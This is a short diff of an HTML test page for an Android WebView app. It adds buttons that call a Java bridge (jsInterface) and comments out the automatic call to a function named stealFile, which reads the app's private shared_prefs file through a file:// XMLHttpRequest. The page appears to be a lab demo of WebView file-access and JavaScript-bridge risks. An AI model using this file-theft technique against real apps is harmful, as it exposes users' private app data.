@@ -1,6 +1,17 @@
 <html>
 <body>
+
+<div id="ttt">111111111</div>
+
+<input type="button" onclick="jsInterface.showToast('测试js调用系统api')" value="调用系统api Toast"/><br/>
+<input type="button" onclick="jsInterface.showJsText('测试java回调js')" value="让java方法回调html中的js方法"/>
 <script>
+
+function jsText(text){
+    //alert(111);
+    document.getElementById('ttt').innerHTML=text;
+}
+
 function stealFile()
 {
 	var file = "file:///data/data/com.example.jin.myapplication/shared_prefs/WebViewChromiumPrefs.xml";
@@ -15,7 +26,10 @@ function stealFile()
 xmlHttpReq.open("GET", file);
 xmlHttpReq.send(null);
 }
-stealFile();
+//stealFile();
+//jsInterface.showToast("xxx");
+//jsInterface.showJsText("aaa");
+//jsText("abc");
 </script>
 </body>
 </html>
